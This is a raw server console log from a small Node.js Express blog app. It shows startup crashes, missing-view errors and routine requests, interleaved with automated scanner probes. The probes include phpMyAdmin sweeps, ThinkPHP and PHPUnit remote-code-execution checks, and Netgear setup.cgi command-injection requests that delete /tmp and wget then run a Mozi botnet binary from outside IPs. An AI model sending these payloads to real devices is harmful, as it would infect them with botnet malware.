[0mGET /stylesheets/style.css [36m304 [0m0.444 ms - -[0m
[0mGET / [36m304 [0m3.619 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.347 ms - -[0m
[0mGET / [36m304 [0m2.885 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.032 ms - -[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.237 ms - 1032[0m
[0mGET / [32m200 [0m3.277 ms - 239[0m
[0mGET / [32m200 [0m3.405 ms - 239[0m
[0mGET / [32m200 [0m9.512 ms - 239[0m
[0mGET /addblog [33m404 [0m3.837 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.337 ms - -[0m
[0mGET /favicon.ico [33m404 [0m5.282 ms - 1032[0m
[0mGET / [32m200 [0m2.780 ms - 239[0m
[0mGET /addblog [33m404 [0m3.366 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.358 ms - -[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m3.841 ms - 1032[0m

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

/home/bitnami/blogger/node_modules/express/lib/router/route.js:202
        throw new Error(msg);
        ^

Error: Route.get() requires a callback function but got a [object Undefined]
    at Route.<computed> [as get] (/home/bitnami/blogger/node_modules/express/lib/router/route.js:202:15)
    at Function.proto.<computed> [as get] (/home/bitnami/blogger/node_modules/express/lib/router/index.js:510:19)
    at Object.<anonymous> (/home/bitnami/blogger/routes/index.js:7:8)
    at Module._compile (internal/modules/cjs/loader.js:1138:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1158:10)
    at Module.load (internal/modules/cjs/loader.js:986:32)
    at Function.Module._load (internal/modules/cjs/loader.js:879:14)
    at Module.require (internal/modules/cjs/loader.js:1026:19)
    at require (internal/modules/cjs/helpers.js:72:18)
    at Object.<anonymous> (/home/bitnami/blogger/app.js:7:19)
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! blogger@0.0.0 start: `node ./bin/www`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the blogger@0.0.0 start script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     /root/.npm/_logs/2020-09-21T23_42_45_924Z-debug.log
[0mGET /addblog [33m404 [0m3.948 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.413 ms - -[0m
[0mGET / [36m304 [0m2.727 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.364 ms - -[0m
[0mGET /AddBlog [33m404 [0m3.182 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.349 ms - -[0m
[0mGET /ListBlogs [33m404 [0m3.773 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.315 ms - -[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m4.108 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m2.882 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m2.616 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m3.727 ms - 1032[0m
[0mPOST /api/jsonws/invoke [33m404 [0m4.081 ms - 1032[0m
[0mGET / [32m200 [0m2.778 ms - 239[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.807 ms - 1032[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m3.871 ms - 1032[0m
[0mGET http://example.com/ [32m200 [0m3.496 ms - 239[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.248.112.171:46285/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m2.993 ms - 1032[0m
[0mGET /t [33m404 [0m3.639 ms - 1032[0m
[0mHEAD / [32m200 [0m3.509 ms - 239[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m3.209 ms - 1032[0m
[0mGET /phpMyAdmin-2/scripts/setup.php [33m404 [0m3.345 ms - 1032[0m
[0mGET /my/scripts/setup.php [33m404 [0m3.817 ms - 1032[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m3.783 ms - 1032[0m
[0mGET /PHPMYADMIN/scripts/setup.php [33m404 [0m3.158 ms - 1032[0m
[0mGET /db/scripts/setup.php [33m404 [0m5.586 ms - 1032[0m
[0mGET /dbadmin/scripts/setup.php [33m404 [0m3.755 ms - 1032[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m3.860 ms - 1032[0m
[0mGET /mysql/scripts/setup.php [33m404 [0m2.852 ms - 1032[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m3.387 ms - 1032[0m
[0mGET /pHpMyAdMiN/scripts/setup.php [33m404 [0m3.149 ms - 1032[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m3.545 ms - 1032[0m
[0mGET /phpadmin/scripts/setup.php [33m404 [0m3.083 ms - 1032[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m3.528 ms - 1032[0m
[0mGET /sqladm/scripts/setup.php [33m404 [0m3.701 ms - 1032[0m
[0mGET /sqladmin/scripts/setup.php [33m404 [0m3.463 ms - 1032[0m
[0mGET /phpmyadmin/scripts/db.init.php [33m404 [0m5.991 ms - 1032[0m
[0mGET /phpMyAdmin/scripts/db.init.php [33m404 [0m2.379 ms - 1032[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m2.461 ms - 1032[0m
[0mGET /database/scripts/setup.php [33m404 [0m2.615 ms - 1032[0m
[0mGET /phpAdmin/scripts/setup.php [33m404 [0m2.186 ms - 1032[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m2.611 ms - 1032[0m
[0mGET /phpmyadmin2/scripts/setup.php [33m404 [0m2.703 ms - 1032[0m
[0mGET /pma/scripts/setup.php [33m404 [0m2.681 ms - 1032[0m
[0mGET /scripts/setup.php [33m404 [0m2.168 ms - 1032[0m
[0mGET /setup.php [33m404 [0m2.533 ms - 1032[0m
[0mGET / [32m200 [0m3.110 ms - 239[0m
[0mHEAD / [32m200 [0m2.474 ms - 239[0m
[0mHEAD /MjZL [33m404 [0m3.087 ms - 1032[0m
[0mGET / [32m200 [0m3.397 ms - 239[0m
[0mGET /ReportServer [33m404 [0m3.755 ms - 1032[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m3.077 ms - 1032[0m
[0mGET /config/getuser?index=0 [33m404 [0m3.732 ms - 1032[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m3.290 ms - 239[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m2.849 ms - 239[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m7.066 ms - 1032[0m
[0mGET /app/.env [33m404 [0m3.607 ms - 1032[0m
[0mPOST /app [33m404 [0m3.264 ms - 1032[0m
[0mGET / [32m200 [0m2.928 ms - 239[0m
[0mPOST /api/jsonws/invoke [33m404 [0m5.251 ms - 1032[0m
[0mGET / [32m200 [0m3.522 ms - 239[0m
[0mGET / [32m200 [0m2.874 ms - 239[0m
[0mGET / [32m200 [0m3.375 ms - 239[0m
[0mGET / [32m200 [0m3.709 ms - 239[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m3.150 ms - 1032[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m3.049 ms - 1032[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m3.150 ms - 1032[0m
[0mGET /pma/scripts/setup.php [33m404 [0m3.320 ms - 1032[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m2.683 ms - 1032[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m2.874 ms - 1032[0m
[0mGET / [32m200 [0m3.583 ms - 239[0m
[0mGET / [32m200 [0m3.694 ms - 239[0m
[0mGET / [32m200 [0m2.887 ms - 239[0m
[0mGET / [32m200 [0m3.137 ms - 239[0m
[0mGET / [32m200 [0m2.707 ms - 239[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m3.672 ms - 1032[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m3.314 ms - 1032[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m3.389 ms - 1032[0m
[0mGET /pma/scripts/setup.php [33m404 [0m2.558 ms - 1032[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m2.837 ms - 1032[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m2.989 ms - 1032[0m
[0mGET / [32m200 [0m3.600 ms - 239[0m
[0mHEAD /robots.txt [33m404 [0m3.157 ms - 1032[0m
[0mGET / [32m200 [0m3.406 ms - 239[0m
[0mGET /ListBlogs [33m404 [0m3.991 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.375 ms - -[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.5.177.55:34368/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m3.372 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET / [31m500 [0m1.122 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET / [31m500 [0m1.055 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /AddBlog [33m404 [0m0.998 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET /ListBlogs [33m404 [0m1.006 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET / [31m500 [0m1.049 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /AddBlog [33m404 [0m0.940 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET /ListBlogs [33m404 [0m4.286 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET /ListBlogs [33m404 [0m0.916 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET / [31m500 [0m1.001 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET / [31m500 [0m0.915 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /AddBlog [33m404 [0m0.841 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET /ListBlogs [33m404 [0m0.888 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET / [31m500 [0m0.914 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.791 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET /?XDEBUG_SESSION_START=phpstorm [31m500 [0m0.953 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [31m500 [0m1.855 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.763 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mPOST /api/jsonws/invoke [33m404 [0m0.680 ms - 1195[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/blogger/app.js:27:3
    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
[0mGET / [31m500 [0m0.897 ms - 1232[0m
Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/blogger/app.js:38:7
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)

> blogger@0.0.0 start /home/bitnami/blogger
> node ./bin/www

[0mGET / [36m304 [0m193.409 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.195 ms - -[0m
[0mGET / [36m304 [0m13.226 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.459 ms - -[0m
[0mGET / [32m200 [0m10.481 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m15.511 ms - 1032[0m
[0mGET http://example.com/ [32m200 [0m19.845 ms - 239[0m
[0mGET / [32m200 [0m15.246 ms - 239[0m
[0mGET / [32m200 [0m11.368 ms - 239[0m
[0mGET /favicon.ico [33m404 [0m26.365 ms - 1032[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m13.943 ms - 1032[0m
[0mGET /AddBlog [33m404 [0m14.262 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.530 ms - -[0m
[0mGET /ListBlogs [33m404 [0m14.361 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.447 ms - -[0m
[0mGET /ListBlogs [33m404 [0m19.174 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.435 ms - -[0m
[0mGET /ListBlogs [33m404 [0m15.124 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.396 ms - -[0m
[0mGET / [36m304 [0m11.078 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.465 ms - -[0m
[0mGET /manager/html [33m404 [0m26.862 ms - 1032[0m
[0mGET / [36m304 [0m14.905 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.485 ms - -[0m
[0mGET /AddBlog [33m404 [0m5.447 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.434 ms - -[0m
[0mGET /ListBlogs [33m404 [0m14.405 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.422 ms - -[0m
[0mGET /ListBlogs [33m404 [0m5.294 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.411 ms - -[0m
[0mGET /ListBlogs [33m404 [0m18.276 ms - 1032[0m
[0mGET /stylesheets/style.css [36m304 [0m0.432 ms - -[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m24.862 ms - 1032[0m
[0mGET / [32m200 [0m11.047 ms - 239[0m
